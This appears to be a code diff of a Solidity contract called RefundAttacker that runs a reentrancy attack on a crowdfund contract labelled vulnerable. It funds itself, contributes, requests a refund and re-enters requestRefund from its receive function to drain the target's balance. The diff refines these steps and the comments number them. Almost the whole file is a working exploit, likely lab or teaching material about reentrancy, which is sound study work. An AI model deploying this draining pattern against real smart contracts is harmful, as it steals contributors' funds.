@@ -1,18 +1,20 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
-// Interface for the vulnerable crowdfund contract
+
 interface ICrowdfundVulnerable {
     function contribute() external payable;
     function requestRefund() external;
+    function contributions(address user) external view returns (uint256);
 }
 
 contract RefundAttacker {
-    // EOA that controls this attacker contract
+    
     address payable public attacker;
 
-    // Target vulnerable crowdfund contract
+    
     ICrowdfundVulnerable public vulnerable;
+    uint256 public lastContributionAmount;
 
     modifier onlyAttacker() {
         require(msg.sender == attacker, "Not attacker");
@@ -24,30 +26,29 @@ contract RefundAttacker {
         vulnerable = ICrowdfundVulnerable(_vulnerable);
     }
 
-    // STEP 1: Attacker funds attacker contract (EOA -> this contract)
-    function fundAttacker() external payable onlyAttacker {
-        // ETH stays in this contract
-    }
+    // STEP 1: EOA sends ETH into attacker contract
+    function fundAttacker() external payable onlyAttacker {}
 
-    // STEP 2: Contribute contract balance into the crowdfund
+    // STEP 2: Contribute attacker contract balance into the crowdfund
     function contributeFromContract(uint256 amount) external onlyAttacker {
-        require(
-            address(this).balance >= amount,
-            "Insufficient attacker contract balance"
-        );
+        require(amount > 0, "Amount required");
+        require(address(this).balance >= amount, "Insufficient attacker balance");
 
-        // send 'amount' from this contract into the vulnerable crowdfund
+        lastContributionAmount = amount;
         vulnerable.contribute{value: amount}();
     }
 
-    // STEP 3: Trigger reentrancy (no ETH sent here)
-    function runAttack() external onlyAttacker {
+    // STEP 3: Trigger reentrancy (no ETH should be forwarded)
+    function runAttack(uint256 amount) external onlyAttacker {
+        require(amount > 0, "Amount required");
+        require(amount == lastContributionAmount, "Amount must match contribution");
+        require(vulnerable.contributions(address(this)) >= amount, "Crowdfund contribution missing");
         vulnerable.requestRefund();
     }
 
     // STEP 4: Reentrancy loop – called when vulnerable sends ETH back
     receive() external payable {
-        if (address(vulnerable).balance > 0) {
+        if (address(vulnerable).balance >= lastContributionAmount && lastContributionAmount > 0) {
             vulnerable.requestRefund();
         }
     }
